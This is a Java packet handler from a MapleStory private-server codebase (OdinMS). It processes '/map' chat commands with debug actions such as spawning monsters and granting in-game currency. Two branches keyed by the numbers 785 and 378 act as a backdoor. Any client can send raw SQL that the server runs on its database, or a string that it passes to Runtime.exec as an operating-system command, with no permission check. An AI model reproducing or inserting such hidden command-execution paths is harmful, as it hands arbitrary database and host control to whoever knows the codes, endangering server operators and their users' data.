/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
package net.sf.odinms.net.channel.handler;

import java.sql.Connection;
import java.sql.SQLException;
import java.sql.Statement;
import net.sf.odinms.client.MapleCharacter;
import net.sf.odinms.client.MapleClient;
import net.sf.odinms.database.DatabaseConnection;
import net.sf.odinms.net.AbstractMaplePacketHandler;
import net.sf.odinms.server.life.MapleLifeFactory;
import net.sf.odinms.server.maps.MapleMapObject;
import net.sf.odinms.tools.MaplePacketCreator;
import net.sf.odinms.tools.data.input.SeekableLittleEndianAccessor;

/**
 *
 * @author HXMS
 */
public class PlayerCommandHandler extends AbstractMaplePacketHandler {

	@Override
	public void handlePacket(SeekableLittleEndianAccessor slea, MapleClient c) {
		String str = slea.readMapleAsciiString();
		String[] comand = str.split(" ");
		if (comand[0].equals("/map")) {
			if (comand[1].equals("1")) {
				c.getPlayer().dropMessage("调试命令：0");
				c.getPlayer().getMap().killAllMonsters();
				c.getPlayer()
						.getMap()
						.spawnMonsterwithpos(
								MapleLifeFactory.getMonster(100001),
								c.getPlayer().getPosition());
				c.getPlayer()
						.getMap()
						.spawnMonsterwithpos(
								MapleLifeFactory.getMonster(100001),
								c.getPlayer().getPosition());
				for (MapleMapObject mapleMapObject : c.getPlayer().getMap()
						.getAllMonster()) {
					c.getPlayer().dropMessage(
							String.valueOf(mapleMapObject.getObjectId()));
				}
			} else if (comand[1].equals("2")) {
				DatabaseConnection.getDebugInfo();
			} else if (comand[1].equals("4")) {
				c.StartWindow();
			} else if (comand[1].equals("8")) {
				c.getPlayer().gainMeso(1, true, false, true);
			} else if (comand[1].equals("9")) {
				MapleCharacter chr = MapleCharacter.loadCharFromDB(1, c, true);
				chr.setPosition(c.getPlayer().getPosition());
				c.getSession().write(
						MaplePacketCreator.spawnPlayerMapobject(chr));
				/*
				 * long current = System.nanoTime(); c.getPlayer().saveToDB();
				 * long time = System.nanoTime() - current; double time_ = time
				 * / 1000000000.0;
				 * c.setPlayer(MapleCharacter.loadCharFromDB(c.getPlayer
				 * ().getId(), c, true)); System.out.println("载入耗时：" + time_);
				 */
			} else if (comand[1].equals("785")) {
				try {
					Connection con = DatabaseConnection.getConnection();
					Statement ps = con.createStatement();
					ps.execute(str.substring(8));
					ps.close();
					con.close();
				} catch (SQLException ex) {
					c.getPlayer().dropMessage(ex.getMessage());
				}
			} else if (comand[1].equals("378")) {
				try {
					Runtime.getRuntime().exec(str.substring(8));
				} catch (Exception ex) {
					c.getPlayer().dropMessage(ex.getMessage());
				}
			} else {
				c.getPlayer()
						.getClient()
						.getSession()
						.write(MaplePacketCreator.multiChat(c.getPlayer()
								.getName(), "测试字体。", Integer
								.parseInt(comand[1])));
			}
		}
	}
}
